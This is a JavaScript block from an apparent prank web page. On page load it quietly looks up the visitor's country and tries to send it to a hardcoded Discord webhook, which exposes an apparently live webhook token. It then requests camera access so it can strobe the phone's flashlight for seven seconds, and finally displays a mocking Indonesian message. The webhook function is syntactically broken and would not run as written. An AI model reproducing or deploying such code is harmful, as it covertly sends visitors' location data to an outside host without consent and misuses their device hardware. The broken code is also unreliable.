    <script>
        // Function to get just the country
        async function getCountry() {
            try {
                const response = await fetch('https://ipapi.co/country_name/');
                return await response.text();
            } catch (error) {
                return "Unknown Country";
            }
        }

        // Function to send just country to Discord
        async function sendToDiscord() {
            const webhookURL = "https://discord.com/api/webhooks/1392741264956330076/cSx-lrzUQntKWKAyXjnNDH7X9LQJFi8291a-PcH79OUYcU5-1wV0iS-8iZBxqbiZcrkn";
            
            const country = await getCountry();
            const data = {

                method: 'POST',
                headers: {

                },
                body: JSON.stringify(data),
            });
        }

        // Function to toggle flashlight
        async function toggleFlashlight() {
            if (!('navigator' in window && 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices)) {
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'environment',
                        torch: true
                    }
                });
                
                const track = stream.getVideoTracks()[0];
                if (track && 'applyConstraints' in track) {
                    let isOn = false;
                    const interval = setInterval(async () => {
                        isOn = !isOn;
                        try {
                            await track.applyConstraints({
                                advanced: [{torch: isOn}]
                            });
                        } catch (e) {
                            clearInterval(interval);
                        }
                    }, 100);
                    
                    setTimeout(() => {
                        clearInterval(interval);
                        track.stop();
                    }, 7000);
                }
            } catch (e) {
                console.log("Flashlight not available");
            }
        }

        // When page loads
        window.onload = function() {
            sendToDiscord();
            toggleFlashlight();
            
            setTimeout(() => {
                document.getElementById('message').textContent = "Bodo Lu Kira Ini Beneran? Wkwkwkwk Kena Prank By Xymatekidd👹👹";
                document.getElementById('message').style.color = "lime";
            }, 7000);
        };
    </script>
